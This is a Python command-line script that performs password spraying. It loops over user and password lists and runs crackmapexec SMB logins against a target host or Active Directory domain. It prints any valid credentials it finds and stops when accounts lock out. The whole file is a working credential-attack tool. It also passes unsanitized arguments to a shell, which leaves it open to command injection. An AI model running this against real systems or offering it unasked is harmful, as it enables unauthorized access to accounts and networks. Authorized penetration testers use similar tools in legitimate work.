#!/usr/bin/env python3

import os
import sys
import time
import subprocess
from argparse import ArgumentParser

def read_list_from_file(file_path):
    with open(file_path, 'r') as file:
        items = [line.strip() for line in file.readlines()]
    return items

import getpass

def password_spray(users, passwords, target, interval, domain):
    lockout_detected = False

    for password in passwords:
        if lockout_detected:
            break

        for user in users:
            print(f"[*] Attempting to authenticate user {user} with password {password}")

            if domain:
                cmd = f"crackmapexec smb {target} -u {domain}/{user} -p {password}"
            else:
                cmd = f"crackmapexec smb {target} --local-auth -u {user} -p {password}"
                
            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True)

            if "STATUS_LOGON_FAILURE" not in result.stdout and "STATUS_ACCOUNT_LOCKED_OUT" not in result.stdout:
                print(f"\033[91m[+] Valid password found for user {user}: {password}\033[0m")
                
                try:
                    user_input = getpass.getpass("Do you want to continue? (yes/no): ").lower()
                    if user_input == "no":
                        return
                except EOFError:
                    print("\nReceived EOF or premature termination. Exiting.")
                    return
                
            if "STATUS_ACCOUNT_LOCKED_OUT" in result.stdout:
                print(f"[!] Account lockout detected for user {user}. Stopping the script.")
                lockout_detected = True
                break

            time.sleep(interval)






def main():
    parser = ArgumentParser(description="CrackMapExec Password Sprayer")
    parser.add_argument("-t", "--target", required=True, help="Target IP or hostname")
    parser.add_argument("-u", "--user-list", required=True, help="Path to a file containing a list of usernames, one per line")
    parser.add_argument("-p", "--password-list", required=True, help="Path to a file containing a list of passwords, one per line")
    parser.add_argument("-i", "--interval", type=int, default=600, help="Time interval between password sprays in seconds (default: 600)")
    parser.add_argument("-d", "--domain", help="Active Directory domain name (optional)")

    args = parser.parse_args()

    users = read_list_from_file(args.user_list)
    passwords = read_list_from_file(args.password_list)
    target = args.target
    interval = args.interval
    domain = args.domain

    password_spray(users, passwords, target, interval, domain)

if __name__ == "__main__":
    main()
